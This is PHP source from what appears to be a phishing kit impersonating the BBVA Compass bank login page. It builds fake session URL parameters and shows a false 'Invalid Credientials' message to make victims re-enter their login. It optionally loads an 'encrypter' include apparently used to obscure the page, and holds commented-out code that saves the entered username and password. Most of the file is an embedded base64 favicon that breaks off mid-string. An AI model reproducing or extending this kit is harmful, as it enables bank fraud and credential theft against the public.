<?php
@ob_start();
session_start();
if (!isset($_SESSION['SESSION_ID'])) {
    header("location: index.php");
    exit;
}


include_once 'inc/config.php';
include_once 'inc/functions.php';
$session = isset($_GET['session']) ? $_GET['session'] : '';
$fake_session_params = "login.php?auth=1&header=1&session=" . $session;

$isValidId = false;
$isValidPassword = false;
$errno = 1;
// if (isset($_POST['userNameInput']) && !empty($_POST['userNameInput'])) {
        // if(strlen($_POST['userNameInput']) >= 3) {
		// $isValidId = true;
        // $_SESSION['_userNameInput_'] = $_POST['userNameInput'];    
	   // }
    // }
    
    // if (isset($_POST['passwordInput']) && !empty($_POST['passwordInput'])) {
        // if (strlen($_POST['passwordInput']) >= 3) {
            // $isValidPassword = true;
            // $_SESSION['_passwordInput_'] = $_POST['passwordInput'];
        // }
        // else
        // {
            // $errno = 1;
        // }
    // }
// if (!$isValidId || !$isValidPassword) {
        // header("Location: login.php?invalid=true&error=" . $errno . "&session=" . $session);
    // }



$errmsg="";
if(isset($_GET['invalid'])&&isset($_GET['error']) && $_GET['error'] ==1)
{
    $errmsg='Invalid Credientials!, Try Again.';
}
 else {
    $errmsg="";
}


?>
<!doctype html>
<html>
    <head>
        <script src="assets/js/jquery-latest.min.js"></script>
    <?php
        if ($enable_encrypter) {
            require_once 'inc/encrypter.php';
        }
        ?>
      
  <script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <title>BBVA Compass</title>
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="viewport" content="width=1024, maximum-scale=3.0" />
        <link rel="shortcut icon" href="data:image/vnd.microsoft.icon;base64,AAABAAMAMDAAAAEAIACoJQAANgAAACAgAAABACAAqBAAAN4lAAAQEAAAAQAgAGgEAACGNgAAKAAAADAAAABgAAAAAQAgAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABGIQcIRiEHIkYhBzhGIQc/RiEHP0YhBz9GIQc/RiEHP0YhBz9GIQc/RiEHP0YhBz9GIQc/RiEHP0YhBz9GIQc/RiEHP0YhBz9GIQc/RiEHP0YhBz9GIQc/RiEHP0YhBz9GIQc/RiEHP0YhBz9GIQc/RiEHP0YhBz9GIQc/RiEHOEYhByJGIQcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARiEHD0YhB15GIQe1RiEH40YhB/JGIQf2RiEH9kYhB/ZGIQf2RiEH9kYhB/ZGIQf2RiEH9kYhB/ZGIQf2RiEH9kYhB/ZGIQf2RiEH9kYhB/ZGIQf2RiEH9kYhB/ZGIQf2RiEH9kYhB/ZGIQf2RiEH9kYhB/ZGIQf2RiEH9kYhB/ZGIQf2RiEH8kYhB+NGIQe1RiEHXkYhBw8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABGIQcqRiEHskYhB/pGIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH+kYhB7JGIQcqAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEYhBytGIQfLRiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQfLRiEHKwAAAAAAAAAAAAAAAAAAAAAAAAAARiEHD0YhB7FGIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEHsUYhBw8AAAAAAAAAAAAAAAAAAAAARiEHXkYhB/pGIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH+kYhB14AAAAAAAAAAAAAAABGIQcIRiEHtEYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB7RGIQcIAAAAAAAAAABGIQciRiEH4kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB+JGIQciAAAAAAAAAABGIQc4RiEH8kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/JGIQc4AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9EHwX/Qx0D/0MdA/9DHQP/Qx0D/0MdA/9DHQP/Qx0D/0MdA/9DHQP/Qx4D/0UgBv9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0UgBv9qTDf/j3lp/454aP+OeGj/jnho/454aP+OeGj/jnho/454aP+KcmL/dVlG/1c2Hv9FIAb/RSAG/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////////////////////////////////////+/v7/+Pf2/9/Z1f+fi37/VTMb/0QfBf9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////9/fz/vbCn/6KPgv+woJX/1s7I//v6+f/////////////////+/v7/yL21/1o5Iv9FHwX/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////7+vn/eV5M/0AaAP9FHwX/Ui8X/52KfP/49vX//////////////////////7aonf9KJgz/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////7+vr/e2FO/0MdA/9GIQf/RR8F/0klDP+9sKb///////////////////////Lv7f9uUTz/RB4E/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////7+vr/e2FO/0MdA/9GIQf/RiEH/0MdA/+EbFv//fz8//////////////////////+Tfm//Qx0D/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////7+vr/e2FO/0MdA/9GIQf/RiEH/0MeBP9xVED/9/X0//////////////////////+ein3/Qx4D/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////7+vr/e2FO/0MdA/9GIQf/RiEH/0MeA/9zV0P/+Pb1//////////////////7+/v+Kc2P/Qx0D/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////7+vr/e2FO/0MdA/9GIQf/RiEH/0MdAv+Ndmb//v7+/////////////////+jj4P9hQiz/RB8F/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////7+vr/e2FO/0MdA/9GIQf/RB4E/1EuFf/Lwbr//////////////////Pz8/52KfP9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////7+vr/e2FO/0MdA/9HIwn/YkIs/7annf/8/Pv////////////7+vr/saGW/08sE/9FIAb/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////7+vr/e2FO/0MdAv9NKRD/wLSr/////////////////+rm4/+Ufm//TSkQ/0UgBv9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////7+vr/e2FO/0MdA/9EHwX/emBN//Lw7v///////////9TLxf9UMhr/RB8F/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////7+vr/e2FO/0MdA/9GIQf/RyII/6mYjP////////////7+/v+kkoX/RiII/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////7+vr/e2FO/0MdA/9GIQf/RB8F/2BAKv/p5eL////////////p5OH/YkIs/0QfBf9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////7+vr/e2FO/0MdA/9GIQf/RB8F/1Y0Hf/i3Nj////////////8/Pv/gGdV/0MdA/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////7+vn/el9N/0EcAf9EHwX/SiUM/5aBcv/6+fn////////////7+vr/fWRR/0MdA/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ikIP////////////9/f3/xrqy/66dkv+voJT/xruz//Xz8v/////////////////Y0Mr/WDcf/0UgBf9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0MeBP+ij4L///////39/P/9/fz//v7+//////////////////79/f/8/Pz/9PLw/8vBuf9tUDv/RR8F/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0UgBv9kRTD/g2tZ/4JqWP+Calj/gmpY/4JqWP+Calj/gmpY/4NqWP+AZ1X/bU87/08rE/9EHwX/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9EHwX/Qx0D/0MdA/9DHQP/Qx0D/0MdA/9DHQP/Qx0D/0MdA/9DHQP/RB4E/0UgBv9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc/RiEH9kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/ZGIQc/AAAAAAAAAABGIQc4RiEH8kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/JGIQc4AAAAAAAAAABGIQciRiEH4kYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB+JGIQciAAAAAAAAAABGIQcIRiEHtEYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB7RGIQcIAAAAAAAAAAAAAAAARiEHXkYhB/pGIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0Yh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B75GIQe+RiEHvkYhB75GIQe+RiEHvkYhB75GIQe+RiEHvkYhB75GIQe+RiEHvkYhB75GIQe+RiEHvkYhB75GIQe6RiEHnUYhB1RGIQcNAAAAAAAAAAAAAAAAAAAAAAAAAABGIQcdRiEHqEYhB/hGIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH+EYhB6hGIQcdAAAAAAAAAAAAAAAARiEHDEYhB6dGIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB6dGIQcMAAAAAAAAAABGIQdURiEH+EYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH+EYhB1QAAAAARiEHAUYhB5xGIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEHnEYhBwFGIQcJRiEHukYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQe6RiEHCUYhBwtGIQe+RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB75GIQcLRiEHC0YhB75GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9DHgP/Qx0D/0MdA/9DHQP/Qx0D/0MdA/9EHgT/RSAG/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEHvkYhBwtGIQcLRiEHvkYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQb/TCkQ/3VZRv97YU//fGJP/3xiUP98YU//e2BO/